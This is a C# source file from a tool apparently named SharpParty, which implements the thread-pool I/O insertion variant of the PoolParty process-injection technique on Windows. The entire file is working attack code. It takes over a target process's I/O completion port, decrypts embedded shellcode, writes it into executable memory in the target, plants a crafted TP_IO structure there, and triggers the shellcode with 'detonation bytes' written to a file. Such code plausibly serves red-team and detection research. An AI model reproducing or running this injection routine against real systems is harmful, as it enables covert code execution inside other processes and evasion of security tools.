﻿/**
* BSD 3-Clause License

* Copyright (c) 2023-2024, SafeBreach Labs
* Copyright (c) 2025, Stroz Friedberg
* All rights reserved.

* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
* 1. Redistributions of source code must retain the above copyright notice, this
*    list of conditions and the following disclaimer.
* 2. Redistributions in binary form must reproduce the above copyright notice,
*    this list of conditions and the following disclaimer in the documentation
*    and/or other materials provided with the distribution.
* 3. Neither the name of the copyright holder nor the names of its
*    contributors may be used to endorse or promote products derived from
*    this software without specific prior written permission.

* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static SharpParty.Enums;
using static SharpParty.Structs;
using static SharpParty.HelperFuncs;
using static SharpParty.Win32;
using static SharpParty.Constants;

namespace SharpParty
{
    internal class RemoteTpIoInsertion
    {
        public unsafe static void Run(IntPtr tProcHandle)
        {
            IntPtr tIoCompletionHandle = HijackTargetHandle(tProcHandle, "IoCompletion");
            if (tIoCompletionHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a handle to target process' I/O Completion Queue (Port).");
                return;
            }
            Console.WriteLine("[+] Obtained handle to target process' I/O completion queue: (0x{0:X16})", tIoCompletionHandle.ToInt64());

            string fn = genRandomName(7);
            IntPtr hFile = CreateFileW(fn, GENERIC_WRITE, FILE_SHARE_MODE.FILE_SHARE_READ | FILE_SHARE_MODE.FILE_SHARE_WRITE, IntPtr.Zero, FILE_CREATION_DISPOSITION.CREATE_ALWAYS, FILE_FLAGS_AND_ATTRIBUTES.FILE_ATTRIBUTE_NORMAL | FILE_FLAGS_AND_ATTRIBUTES.FILE_FLAG_OVERLAPPED, IntPtr.Zero);
            Console.WriteLine("[+] File created with name = {0:s}", fn);

            byte[] sc = aesDecrypt(ENC_SC, Convert.FromBase64String(DEC_KEY));
            uint scSize = (uint)sc.Length;

            IntPtr scAddr = VirtualAllocEx(tProcHandle, IntPtr.Zero, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (scAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate shellcode memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Allocated shellcode memory in target process: 0x{0:X16}", scAddr.ToInt64());
            }

            IntPtr bytesWritten = IntPtr.Zero;
            bool writeRes;
            fixed (byte* p = sc)
            {
                IntPtr ptr = (IntPtr)p;
                writeRes = WriteProcessMemory(tProcHandle, scAddr, ptr, scSize, out bytesWritten);
            }

            if (!writeRes)
            {
                Console.WriteLine("[-] Failed to write shellcode to allocated memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Successfully wrote shellcode to allocated memory in target process. (bytesWritten = " + bytesWritten + ")");
            }

            IntPtr pTpIoPtr = CreateThreadpoolIo(hFile, (TP_WIN32_IO_CALLBACK*)scAddr, IntPtr.Zero, IntPtr.Zero);
            FULL_TP_IO* pTpIo = (FULL_TP_IO*)pTpIoPtr;
            if (pTpIo == null || pTpIoPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create ThreadPoolIo.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Created thread pool I/O: 0x{0:X16}", new IntPtr(pTpIo).ToInt64());
            }

            pTpIo->CleanupGroupMember.callbackUnion.Callback = scAddr;
            pTpIo->PendingIrpCount++;

            IntPtr pRemoteTpIoPtr = VirtualAllocEx(tProcHandle, IntPtr.Zero, (uint)sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (pRemoteTpIoPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate remote TP_IO.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Allocated memory for remote TP_IO: 0x{0:X16}", pRemoteTpIoPtr.ToInt64());
            }

            bytesWritten = IntPtr.Zero;
            bool writeTpIoRes = WriteProcessMemory(tProcHandle, pRemoteTpIoPtr, pTpIoPtr, (uint)sizeof(FULL_TP_IO), out bytesWritten);
            if (!writeTpIoRes)
            {
                Console.WriteLine("[-] Failed to write crafted TP_IO to allocated memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Wrote the crafted TP_IO struct to the allocated memory (bytesWritten = " + bytesWritten + ")");
            }

            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
            FILE_COMPLETION_INFORMATION FileIoCompletionInformation = new FILE_COMPLETION_INFORMATION();
            FileIoCompletionInformation.Port = tIoCompletionHandle;
            IntPtr pRemoteTpIoDirect = new IntPtr(pRemoteTpIoPtr.ToInt64() + 0xC8); // Cast + dereference ptr to FULL_TP_IO results in accessviolation; calculate address of "Direct" from ptr to the struct (ptr + 200).
            FileIoCompletionInformation.Key = pRemoteTpIoDirect; // Need a ptr to 'Direct' field of 'pRemoteTpIo'; '&pRemoteTpIo->Direct' will dereference, causing accessviolation.
            uint status = NtSetInformationFile(hFile, &IoStatusBlock, &FileIoCompletionInformation, (ulong)sizeof(FILE_COMPLETION_INFORMATION), FILE_INFORMATION_CLASS.FileReplaceCompletionInformation);
            if (status == 0)
            {
                Console.WriteLine("[+] Associated the created file with I/O Completion Queue (Port) of target process' worker factory.");
            }
            else
            {
                Console.WriteLine("[-] Failed to associate the created file with I/O Completion Queue (Port) of target process' worker factory.");
                Console.WriteLine("[-] NTSTATUS = 0x{0:X16}", status);
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }

            byte[] op = new byte[] { 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef };
            int opSize = op.Length;
            IntPtr opBytesWritten = IntPtr.Zero;
            NativeOverlapped overlapped = default;
            bool writeDet = WriteFile(hFile, op, (uint)opSize, out opBytesWritten, ref overlapped);
            if (!writeDet)
            {
                int win32Err = Marshal.GetLastWin32Error();
                if (win32Err == 0x000003E5)
                {
                    Console.WriteLine("[+] Async write to file is pending, detonation bytes will be written.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to write detonation bytes to file.");
                    Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                    return;
                }
            }
            else
            {
                Console.WriteLine("[+] Successfully wrote detonation bytes to file (bytesWritten = " + opBytesWritten + ")");
            }
        }
    }
}
